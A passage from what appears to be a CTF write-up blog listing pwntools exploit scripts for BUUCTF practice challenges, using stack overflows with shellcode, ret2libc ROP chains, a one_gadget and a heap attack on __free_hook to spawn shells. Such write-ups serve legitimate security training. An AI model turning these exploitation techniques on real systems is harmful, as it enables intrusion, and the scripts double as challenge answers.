class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "i386"</span><br><span class="line">elf = ELF("ez_pz_hackover_2016")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./ez_pz_hackover_2016")</span><br><span class="line"></span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">sh.recvuntil("Yippie, lets crash: 0x")</span><br><span class="line">str_addr = int(sh.recvuntil("\n",True),16)</span><br><span class="line">offset = 16</span><br><span class="line">payload  = "crashme\x00"</span><br><span class="line">payload  = payload.ljust(10,"\x00")</span><br><span class="line">payload += offset * "a"</span><br><span class="line">payload += p32(str_addr + len(payload) + 4 - 0x3a) + asm(shellcraft.sh())</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("buuoj.cn",20040,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x09-tiny-backdoor-v1-hackover-2016"><a href="#0x09-tiny-backdoor-v1-hackover-2016" class="headerlink" title="0x09 tiny_backdoor_v1_hackover_2016"></a>0x09 tiny_backdoor_v1_hackover_2016</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("tiny_backdoor_v1_hackover_2016")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./tiny_backdoor_v1_hackover_2016")</span><br><span class="line"></span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line"></span><br><span class="line">#payload = "a"*0x9</span><br><span class="line">key = 'e6d9f6382a02fd3ac3'.decode('hex')</span><br><span class="line">sh.send(key)</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("buuoj.cn",20050,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x10-bbys-tu-2016"><a href="#0x10-bbys-tu-2016" class="headerlink" title="0x10 bbys_tu_2016"></a>0x10 bbys_tu_2016</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "i386"</span><br><span class="line">elf = ELF("bbys_tu_2016")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./bbys_tu_2016")</span><br><span class="line"></span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line"></span><br><span class="line">offset = 24</span><br><span class="line">payload  = offset * "a"</span><br><span class="line">payload += p32(0x0804856D)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("buuoj.cn",20060,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x11-oneshot-tjctf-2016"><a href="#0x11-oneshot-tjctf-2016" class="headerlink" title="0x11 oneshot_tjctf_2016"></a>0x11 oneshot_tjctf_2016</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("oneshot_tjctf_2016")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./oneshot_tjctf_2016")</span><br><span class="line">lib = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">lib = ELF("x64_libc.so.6")</span><br><span class="line">sh.recvuntil("Read location?\n")</span><br><span class="line">sh.sendline(str(elf.got['__libc_start_main']))</span><br><span class="line">sh.recvuntil("Value: 0x0000")</span><br><span class="line">__libc_start_main = int(sh.recvuntil("\n",True),16)</span><br><span class="line">libc = __libc_start_main - lib.symbols['__libc_start_main']</span><br><span class="line">one_gadget = libc + 0xf1147</span><br><span class="line">sh.sendline(str(one_gadget))</span><br><span class="line">log.success("__libc_start_main: " + hex(__libc_start_main))</span><br><span class="line">log.success("libc: " + hex(libc))</span><br><span class="line">log.success("one_gadget: " + hex(one_gadget))</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("buuoj.cn",20082,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x12-pwn1-sctf-2016"><a href="#0x12-pwn1-sctf-2016" class="headerlink" title="0x12 pwn1_sctf_2016"></a>0x12 pwn1_sctf_2016</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "i386"</span><br><span class="line">elf = ELF("pwn1_sctf_2016")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./pwn1_sctf_2016")</span><br><span class="line"></span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line"></span><br><span class="line">payload = "I" * 19 + "a" * 7 + p32(0x08048F0D)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("buuoj.cn",20086,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x13-pwn2-sctf-2016"><a href="#0x13-pwn2-sctf-2016" class="headerlink" title="0x13 pwn2_sctf_2016"></a>0x13 pwn2_sctf_2016</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "i386"</span><br><span class="line">elf = ELF("pwn2_sctf_2016")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./pwn2_sctf_2016")</span><br><span class="line">lib = ELF("libc-2.23.so")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">lib = ELF("x86_libc.so.6")</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline("-1")</span><br><span class="line">offset = 48</span><br><span class="line">start_addr = 0x080483D0</span><br><span class="line">payload = offset * "a"</span><br><span class="line">payload += p32(elf.plt['printf'])</span><br><span class="line">payload += p32(start_addr)</span><br><span class="line">payload += p32(0x080486F8)</span><br><span class="line">payload += p32(elf.got['__libc_start_main'])</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(flat(payload))</span><br><span class="line">sh.recvuntil("You said: ")</span><br><span class="line">sh.recvuntil("You said: ")</span><br><span class="line">__libc_start_main = u32(sh.recv(4))</span><br><span class="line">libc = __libc_start_main - lib.symbols['__libc_start_main']</span><br><span class="line">system_addr = libc + lib.symbols['system']</span><br><span class="line">binsh = libc + lib.search("/bin/sh\x00").next()</span><br><span class="line">sh.sendline("-1")</span><br><span class="line">payload = offset * "a"</span><br><span class="line">payload += p32(system_addr)</span><br><span class="line">payload += p32(0x080486F8)</span><br><span class="line">payload += p32(binsh)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">log.success("libc:" + hex(libc))</span><br><span class="line">log.success("system_addr:" + hex(system_addr))</span><br><span class="line">log.success("binsh:" + hex(binsh))</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("buuoj.cn",20087,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x14-ciscn-2019-c-1"><a href="#0x14-ciscn-2019-c-1" class="headerlink" title="0x14 ciscn_2019_c_1"></a>0x14 ciscn_2019_c_1</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("ciscn_2019_c_1")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./ciscn_2019_c_1")</span><br><span class="line">lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">lib = ELF("/home/pig/Pig/CTF/BUUCTF/BUUCTF_libc/x64_libc.so.6")</span><br><span class="line">sh.recvuntil("Input your choice!")</span><br><span class="line">pop3_ret = 0x0000000000400c7f</span><br><span class="line">pop_rdi_ret = 0x0000000000400c83</span><br><span class="line">pop_rsi_r15_ret = 0x0000000000400c81</span><br><span class="line">payload  = '\x00' * (0x50 + 0x8)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(elf.got['__libc_start_main']) + p64(elf.plt['puts']) + p64(elf.symbols['main'])</span><br><span class="line">sh.sendline("1")</span><br><span class="line">sh.recvuntil("Input your Plaintext to be encrypted\n")</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil("Ciphertext\n\n")</span><br><span class="line">libc = u64(sh.recvuntil("\n",True).ljust(8,"\x00")) - lib.symbols['__libc_start_main']</span><br><span class="line">system = libc + lib.symbols['system']</span><br><span class="line">binsh = libc+ lib.search("/bin/sh\x00").next()</span><br><span class="line">sh.sendline("1")</span><br><span class="line">sh.recvuntil("Input your Plaintext to be encrypted\n")</span><br><span class="line">payload  = "\x00" * (0x50 + 0x8)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(binsh) + p64(system)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">log.success("libc: " + hex(libc))</span><br><span class="line">log.success("binsh: " + hex(binsh))</span><br><span class="line">log.success("system: " + hex(system))</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("buuoj.cn",20115,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x15-ciscn-2019-n-1"><a href="#0x15-ciscn-2019-n-1" class="headerlink" title="0x15 ciscn_2019_n_1"></a>0x15 ciscn_2019_n_1</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from time import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("ciscn_2019_n_1")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./ciscn_2019_n_1")</span><br><span class="line"></span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">pop_rdi_ret = 0x400793</span><br><span class="line">offset = 56</span><br><span class="line">payload  = offset * "a"</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(elf.bss()) + p64(elf.plt['gets'])</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(elf.bss()) + p64(elf.plt['system'])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.sendline("/bin/sh\x00")</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("buuoj.cn",20137,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x16-ciscn-2019-n-8"><a href="#0x16-ciscn-2019-n-8" class="headerlink" title="0x16 ciscn_2019_n_8"></a>0x16 ciscn_2019_n_8</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "i386"</span><br><span class="line">elf = ELF("ciscn_2019_n_8")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./ciscn_2019_n_8")</span><br><span class="line"></span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">sh.recv()</span><br><span class="line">payload = "\x11" * 0x35</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("buuoj.cn",20144,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x17-ciscn-2019-sw-7"><a href="#0x17-ciscn-2019-sw-7" class="headerlink" title="0x17 ciscn_2019_sw_7"></a>0x17 ciscn_2019_sw_7</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("ciscn_2019_sw_7")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def add(size,content):</span><br><span class="line">sh.recvuntil(">")</span><br><span class="line">sh.sendline("1")</span><br><span class="line">sh.recvuntil("The size of note:")</span><br><span class="line">sh.sendline(str(size))</span><br><span class="line">sh.recvuntil("The content of note:")</span><br><span class="line">sh.send(content)</span><br><span class="line">def show(idx):</span><br><span class="line">sh.recvuntil(">")</span><br><span class="line">sh.sendline("2")</span><br><span class="line">sh.recvuntil("Index:")</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line">def free(idx):</span><br><span class="line">sh.recvuntil(">")</span><br><span class="line">sh.sendline("4")</span><br><span class="line">sh.recvuntil("Index:")</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line">def add_str(size,content):</span><br><span class="line">        sh.recvuntil(">")</span><br><span class="line">        sh.sendline("1")</span><br><span class="line">        sh.recvuntil("The size of note:")</span><br><span class="line">        sh.sendline(size)</span><br><span class="line">        sh.recvuntil("The content of note:")</span><br><span class="line">        sh.send(content)</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./ciscn_2019_sw_7")</span><br><span class="line">lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">main_arena_offset = 0x7fc161d75b20 - 0x7fc1619b1000</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">lib = ELF("/home/pig/Pig/CTF/BUUCTF/BUUCTF_libc/x64_libc.so.6")</span><br><span class="line">main_arena_offset = 0x3C4B20</span><br><span class="line">add(0x10,"\x11" * 0xF + "\n")</span><br><span class="line">add(0x10,"\x22" * 0xF + "\n")</span><br><span class="line">add(0x60,"\x33" * 0xF + "\n")</span><br><span class="line">add(0x60,"\x77" * 0x5F + "\n")</span><br><span class="line">add(0x10,"\x44" * 0xF + "\n")</span><br><span class="line">free(0)</span><br><span class="line">payload  = p64(0) * 2</span><br><span class="line">payload += p64(0x91) + p64(0x10) + p64(0) * 2 + p64(0x71) + p64(0x60)</span><br><span class="line">add_str("-1",payload + "\n")</span><br><span class="line">free(1)</span><br><span class="line">add(0x10,"\x55" * 0xF + "\n")</span><br><span class="line">show(2)</span><br><span class="line">sh.recvuntil("2 : ")</span><br><span class="line">main_arena = u64(sh.recvuntil("\x7f").ljust(8,"\x00")) - 88</span><br><span class="line">libc = main_arena - main_arena_offset</span><br><span class="line">system = libc + lib.symbols['system']</span><br><span class="line">__free_hook = libc + 0x3C67A8</span><br><span class="line">free(0)</span><br><span class="line">payload = p64(0) * 2 + p64(0x21) + p64(0x10) + p64(0) * 2 + p64(0x71) + p64(main_arena + 88) + p64(__free_hook - 0x40) + "\n"</span><br><span class="line">add_str("-1",payload)</span><br><span class="line">add(0x60,"\x66" * 0x5F + "\n")</span><br><span class="line">free(0)</span><br><span class="line">free(3)</span><br><span class="line">payload  = p64(0)*2 + p64(0x21) + p64(0x10) + p64(0)*2 + p64(0x71) + p64(0x60) + p64(0) * 12 + p64(0x71) + p64(__free_hook - 0x33)</span><br><span class="line">payload += p64(0) * 12 + p64(0x21) + "/bin/sh\x00\n"</span><br><span class="line">add_str("-1",payload)</span><br><span class="line">add(0x60,"aaaa\n")</span><br><span class="line">payload = '\x7f\x00\x00' + p64(0) * 3 + p64(system) + "\n"</span><br><span class="line">add(0x60,payload)</span><br><span class="line">log.success("libc: " + hex(libc))</span><br><span class="line">log.success("main_arena: " + hex(main_arena))</span><br><span class="line">log.success("__free_hook: " + hex(__free_hook))</span><br><span class="line">log.success("system: " + hex(system))</span><br><span class="line">#input()</span><br><span class="line">free(4)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">#x/50gx (long long)(&main_arena)</span><br><span class="line">#x/50gx (long long)(&__free_hook) - 0x50</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("buuoj.cn",20134,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x18-espcially-tu-2016"><a href="#0x18-espcially-tu-2016" class="headerlink" title="0x18 espcially_tu_2016"></a>0x18 espcially_tu_2016</h2><h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一:"></a>解法一:</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "i386"</span><br><span class="line">elf = ELF("espcially_tu_2016")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./espcially_tu_2016")</span><br><span class="line">lib = ELF("/lib/i386-linux-gnu/libc.so.6")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">lib = ELF("/home/pig/Pig/CTF/BUUCTF/BUUCTF_libc/x86_libc.so.6")</span><br><span class="line">pop_ebp_ret = 0x0804864f</span><br><span class="line">pop_ebx_esi_edi_ebp_ret = 0x0804864C</span><br><span class="line">pop3_ret = 0x0804864d</span><br><span class="line">gets_plt = 0x080483D0</span><br><span class="line">offset = 44</span><br><span class="line">payload  = offset * "a"</span><br><span class="line">payload += p32(elf.plt['puts']) + p32(pop_ebp_ret) + p32(elf.got['__libc_start_main'])</span><br><span class="line">payload += p32(gets_plt) + p32(pop_ebp_ret) + p32(elf.got["printf"])</span><br><span class="line">payload += p32(gets_plt) + p32(pop_ebp_ret) + p32(elf.got['printf'])</span><br><span class="line">payload += p32(gets_plt) + p32(pop_ebp_ret) + p32(elf.bss())</span><br><span class="line">payload += p32(elf.plt['printf']) + p32(0xdeadbeef) + p32(elf.bss())</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline("1")</span><br><span class="line">sh.recvuntil("number!\n")</span><br><span class="line">__libc_start_main = u32(sh.recv(4))</span><br><span class="line">libc = __libc_start_main - lib.symbols['__libc_start_main']</span><br><span 